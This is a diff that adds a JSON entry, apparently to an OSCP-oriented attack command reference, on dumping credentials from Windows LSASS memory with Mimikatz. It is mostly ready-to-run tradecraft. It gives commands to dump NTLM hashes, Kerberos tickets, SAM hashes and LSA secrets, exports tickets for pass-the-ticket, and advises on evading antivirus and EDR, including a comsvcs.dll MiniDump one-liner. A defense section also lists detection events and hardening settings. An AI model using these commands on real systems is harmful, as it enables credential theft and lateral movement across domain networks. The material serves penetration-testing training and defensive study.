@@ -1,0 +1,140 @@
+{
+  "id": "ad-mimikatz-sekurlsa",
+  "name": "Mimikatz - Dump Cached Credentials (sekurlsa)",
+  "command": "privilege::debug\nsekurlsa::logonpasswords",
+  "description": "Dumps NTLM hashes, Kerberos tickets, and sometimes cleartext passwords from LSASS memory. Requires SYSTEM or SeDebugPrivilege. sekurlsa::logonpasswords extracts credentials from all interactive, service, and network logon sessions cached in LSASS. sekurlsa::tickets dumps Kerberos TGTs and service tickets — export them for offline use or pass-the-ticket attacks. This is the first credential harvest step after gaining a foothold on any domain-joined Windows host.",
+  "type": "command",
+  "platform": "windows",
+  "requires": [
+    "local-admin",
+    "av-bypass"
+  ],
+  "tools": [
+    "mimikatz"
+  ],
+  "tags": [
+    "active-directory",
+    "credential-dumping",
+    "mimikatz",
+    "lsass",
+    "sekurlsa",
+    "ntlm",
+    "kerberos",
+    "cached-credentials"
+  ],
+  "category": "Credential Access",
+  "subcategory": "Credential Dumping",
+  "certifications": [
+    "OSCP"
+  ],
+  "primary_cert": "OSCP",
+  "source": "OSCP PEN-200 Chapter 22: Attacking Active Directory Authentication (22.1.3)",
+  "examples": [
+    {
+      "label": "Enable SeDebugPrivilege then dump all logon session credentials",
+      "command": "privilege::debug\nsekurlsa::logonpasswords"
+    },
+    {
+      "label": "Dump Kerberos tickets from LSASS memory",
+      "command": "privilege::debug\nsekurlsa::tickets"
+    },
+    {
+      "label": "Export tickets to .kirbi files for offline PTT",
+      "command": "privilege::debug\nsekurlsa::tickets /export"
+    },
+    {
+      "label": "Run mimikatz from PowerShell (bypass AV with obfuscation first)",
+      "command": "cd C:\\Tools\n.\\mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit"
+    },
+    {
+      "label": "Dump only NTLM hashes (less noisy than full logonpasswords)",
+      "command": "sekurlsa::msv"
+    },
+    {
+      "label": "Dump local SAM hashes (requires SYSTEM token)",
+      "command": "privilege::debug\ntoken::elevate\nlsadump::sam"
+    },
+    {
+      "label": "Dump LSA secrets (cleartext service account passwords)",
+      "command": "privilege::debug\ntoken::elevate\nlsadump::lsa /patch"
+    },
+    {
+      "label": "Purge Kerberos tickets (clean slate before PTT)",
+      "command": "kerberos::purge"
+    },
+    {
+      "label": "Spawn cmd under current token context",
+      "command": "misc::cmd"
+    },
+    {
+      "label": "Dump tickets for service access (OSCP Ch22 style)",
+      "command": "privilege::debug\nsekurlsa::tickets"
+    }
+  ],
+  "notes": "SeDebugPrivilege lets any process open handles to processes owned by other users including LSASS. Most AV/EDR products flag mimikatz.exe by name/hash — rename or obfuscate. Cleartext passwords only appear when WDigest is enabled (Windows 7/Server 2008 R2 default; disabled by default in 8.1+). NTLM hashes are always present for recently logged-in users. sekurlsa::tickets /export dumps each ticket as a .kirbi file — use with kerberos::ptt for pass-the-ticket. Running from an already-elevated shell (local admin) is sufficient if SeDebugPrivilege is available. If LSASS is running as Protected Process Light (PPL), direct sekurlsa attacks fail; use a PPL bypass or dump via Task Manager / procdump first. sekurlsa::tickets dumps Kerberos tickets (TGT + service tickets) from LSASS memory — use /export to write .kirbi files for kerberos::ptt injection. Also covered in: OSCP PEN-200 Chapter 22 (Attacking Active Directory Authentication).",
+  "references": [
+    {
+      "title": "OffSec PEN-200 - Attacking Active Directory Authentication",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    },
+    {
+      "title": "Mimikatz GitHub - gentilkiwi",
+      "url": "https://github.com/gentilkiwi/mimikatz"
+    },
+    {
+      "title": "MITRE ATT&CK - OS Credential Dumping: LSASS Memory",
+      "url": "https://attack.mitre.org/techniques/T1003/001/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "sedebug-lsass-dump",
+      "rel": "alternative",
+      "note": "Offline approach: dump LSASS to file first, then parse with pypykatz (avoids interactive mimikatz)."
+    },
+    {
+      "id": "mimikatz-ptt",
+      "rel": "next",
+      "note": "Import exported .kirbi tickets with kerberos::ptt for pass-the-ticket."
+    },
+    {
+      "id": "ad-silver-ticket",
+      "rel": "escalation",
+      "note": "Use dumped service account NT hashes to forge silver tickets."
+    }
+  ],
+  "opsec": "loud",
+  "mitre": [
+    "T1003.001",
+    "T1558"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "Mimikatz sekurlsa::logonpasswords reads the LSASS process memory to extract all cached credentials: NTLM hashes, Kerberos tickets, and (if WDigest enabled) cleartext passwords. The msv1_0 SSP, wdigest SSP, and kerberos SSP all cache credential material in LSASS to support SSO — Mimikatz knows the memory layout of each Windows version and reads them directly.",
+    "prerequisites": "Local Administrator or SYSTEM on target host. LSASS not PPL-protected. Credential Guard not enabled. Mimikatz or SafetyKatz on target. SeDebugPrivilege available.",
+    "impact": "T1003.001 OS Credential Dumping: LSASS Memory + T1558 Kerberos Ticket Abuse. All cached credentials extracted — NTLM hashes for PtH, Kerberos tickets for PtT, cleartext passwords for direct reuse. Affects every account that has logged on to the host.",
+    "detection": "Sysmon Event 10: process accessing lsass.exe from non-SYSTEM source. Event 4656: handle request to LSASS. Windows Defender / EDR: Mimikatz signature detection. Event 4688: suspicious process on host. Dump file creation (*.dmp) if MiniDump approach used.\nProcesses accessing LSASS memory or SAM registry hives outside of trusted security tools, often followed by file creation or lateral movement (DET0234/AN0648).\nProcesses opening /proc/*/mem or /proc/*/maps targeting credential-storing services like sshd or login; high privilege escalation and memory inspection tools such as gcore or gdb (AN0649).\nUnsigned processes accessing system memory or launching known credential scraping tools (e.g., osascript, dylib injections) to access the Keychain or sensitive memory regions (AN0650).",
+    "artifacts": "Sysmon Event 10: lsass.exe access from admin process | EDR alert: Mimikatz / credential dumping signature | Event 4656: LSASS handle | Dump file on disk if MiniDump used | Event 4624 from new hosts if dumped creds used",
+    "prevention": "Enable LSASS PPL (RunAsPPL = 1). Enable Credential Guard (VBS). Disable WDigest (UseLogonCredential = 0). Deploy EDR on all hosts. Protected Users group for sensitive accounts. Minimize who can log on interactively to servers.\nActive Directory Configuration: Manage ACL for 'Replicating Directory Changes All'; add users to Protected Users security group to limit cached plaintext credentials.\nBehavior Prevention on Endpoint: Enable Windows 10 ASR rules to secure LSASS and prevent credential stealing.\nCredential Access Protection: Enable Credential Guard (Windows 10+) to protect LSA secrets; enable Protected Process Light for LSA on Server 2012 R2.\nEncrypt Sensitive Information: Ensure Domain Controller backups are properly secured.\nOperating System Configuration: Disable or restrict NTLM; disable WDigest authentication.\nPassword Policies: Ensure local administrator accounts have complex, unique passwords across all systems.\nPrivileged Account Management: Do not place domain accounts in local admin groups across systems; limit cross-tier admin use; on Linux restrict root access to prevent memory scraping.",
+    "evasion": "Direct syscalls to bypass API-level EDR hooks. Dump via comsvcs.dll MiniDump (built-in): rundll32 comsvcs.dll MiniDump <lsass_pid> lsass.dmp full. Use Cobalt Strike's built-in logonpasswords (LSASS access through BOF). Read LSASS via remote access (procdump from DC) rather than on-host.",
+    "sources": [
+      "https://attack.mitre.org/techniques/T1003/001/",
+      "https://attack.mitre.org/techniques/T1558/"
+    ],
+    "misconfiguration": "RunAsPPL = 0 (default on older systems). WDigest UseLogonCredential = 1 (stores cleartext). Credential Guard not deployed. EDR absent. DA/EA accounts log on interactively to workstations (credentials cached there).",
+    "vulnerable_config": "# RunAsPPL disabled:\n(Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa').RunAsPPL  # null or 0\n\n# WDigest enabled:\n(Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest').UseLogonCredential  # 1\n\n# Credential Guard absent:\n(Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard').EnableVirtualizationBasedSecurity  # 0",
+    "secure_config": "# Enable RunAsPPL:\nSet-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa' -Name RunAsPPL -Value 1\n\n# Disable WDigest:\nSet-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest' -Name UseLogonCredential -Value 0\n\n# Credential Guard via GPO:\n# Computer Config → Admin Templates → System → Device Guard\n# → Turn on Virtualization Based Security: Enabled\n# → Credential Guard: Enabled with UEFI lock\n\n# Sysmon rule:\n# <ProcessAccess onmatch='include'><TargetImage condition='is'>C:\\Windows\\system32\\lsass.exe</TargetImage></ProcessAccess>"
+  },
+  "variations": [
+    {
+      "description": "Dump Kerberos tickets from memory (TGT and service tickets)",
+      "command": "privilege::debug\nsekurlsa::tickets",
+      "label": "privilege::debug sekurlsa::tickets"
+    },
+    {
+      "description": "Dump Kerberos tickets with /export flag (save .kirbi files to disk)",
+      "command": "privilege::debug\nsekurlsa::tickets /export",
+      "label": "privilege::debug sekurlsa::tickets…"
+    }
+  ]
+}
